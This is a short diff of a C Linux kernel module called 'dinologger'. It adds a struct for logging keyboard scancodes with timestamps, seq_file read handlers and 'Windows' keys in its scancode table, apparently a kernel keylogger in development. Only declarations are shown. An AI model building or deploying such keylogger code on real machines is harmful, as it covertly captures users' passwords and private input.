@@ -10,13 +10,27 @@
 #include "linux/rtc.h"
 #include "linux/slab.h"
 #include "linux/kernel.h"
+#include "linux/list.h"
+#include "linux/seq_file.h"
+
+typedef struct log_node {
+	struct rtc_time time;
+	int scancode;
+	int release;
+
+	char *log;
+	struct list_head list;
+} log_node;
 
 int __init m_init(void);
 void __exit m_exit(void);
 
-static ssize_t device_read(struct file *, char *, size_t, loff_t *);
-static int device_open(struct inode *inode, struct file *file);
-static int device_release(struct inode *inode, struct file *file);
+static int ct_open(struct inode *inode, struct file *file);
+static void *seq_start(struct seq_file *s, loff_t *pos);
+static void seq_stop(struct seq_file *_s, void *_v);
+static void *ct_seq_next(struct seq_file *s, void *v, loff_t *pos);
+
+static int seq_show(struct seq_file *seq, void *v);
 
 #define DEVICE_NAME "dinologger"
 #define LOG(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", ## __VA_ARGS__)
@@ -52,5 +66,5 @@ static int device_release(struct inode *inode, struct file *file);
 	"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "Num Lock", "Scroll Lock",	\
 	"Home", "Up", "Page up", "-", "Left", UNMAPPED, "Right", "+", "End",		\
 	"Down", "Page down", "Insert", "Delete", UNMAPPED, UNMAPPED, UNMAPPED,		\
-	"F11", "F12", UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED,	\
+	"F11", "F12", UNMAPPED, UNMAPPED, "Windows", "Windows", UNMAPPED, UNMAPPED,	\
 	UNMAPPED, "Fn"
